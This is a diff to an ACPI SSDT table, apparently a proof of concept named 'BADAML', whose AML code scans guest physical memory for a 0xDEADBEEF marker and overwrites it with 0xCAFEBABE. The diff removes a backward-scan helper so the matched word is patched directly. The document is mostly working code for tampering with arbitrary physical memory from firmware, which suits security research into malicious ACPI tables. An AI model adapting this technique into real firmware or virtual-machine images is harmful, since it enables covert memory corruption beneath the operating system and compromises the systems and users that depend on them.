@@ -15,8 +15,7 @@
     - Scans guest physical memory from 0x40000000 (1GB) in 8MB steps,
       looking for the 0xDEADBEEF pattern. Since the target file is 16MB,
       an 8MB step guarantees a hit.
-    - Once found, scans backward to find the start of the pattern block.
-    - Overwrites the first 4 bytes with 0xCAFEBABE.
+    - Once found, overwrites the matched 4 bytes with 0xCAFEBABE.
 */
 
 // Define an SSDT table. This is one of the tables that can contain AML code.
@@ -69,25 +68,6 @@ DefinitionBlock ("", "SSDT", 6, "BADAML", "BADAML", 0x20240306)
                 Return (Zero)
             }
 
-            // Fine scan backward from Arg0 to find start of pattern block.
-            // Returns start address of contiguous pattern.
-            Method (FSCN, 2, Serialized)
-            {
-                Local0 = Arg0
-
-                While (One)
-                {
-                    Local1 = Local0 - 4
-                    If (RD32(Local1) != Arg1)
-                    {
-                        Return (Local0)
-                    }
-                    Local0 = Local1
-                }
-
-                Return (Local0)
-            }
-
             // Patch 4 bytes at Arg0 with value Arg1.
             // Returns original value.
             Method (PT32, 2, Serialized)
@@ -131,15 +111,10 @@ DefinitionBlock ("", "SSDT", 6, "BADAML", "BADAML", 0x20240306)
 
                 If (Local2 != Zero)
                 {
-                    Debug = "BADAML: coarse hit, finding start of block"
-
-                    // Fine scan backward to find start of the target file.
-                    Local3 = FSCN(Local2, 0xEFBEADDE)
-
-                    Debug = "BADAML: pattern block found, overwriting with 0xcafebabe"
-                    // Patch the first 4 bytes of the target file.
-                    // Again, little-endian so we write 0xBEBAFECA.
-                    PT32(Local3, 0xBEBAFECA)
+                    Debug = "BADAML: pattern found, overwriting with 0xcafebabe"
+                    // Patch the matched 4 bytes. Little-endian, so this writes
+                    // bytes CA FE BA BE.
+                    PT32(Local2, 0xBEBAFECA)
                 }
                 Else
                 {
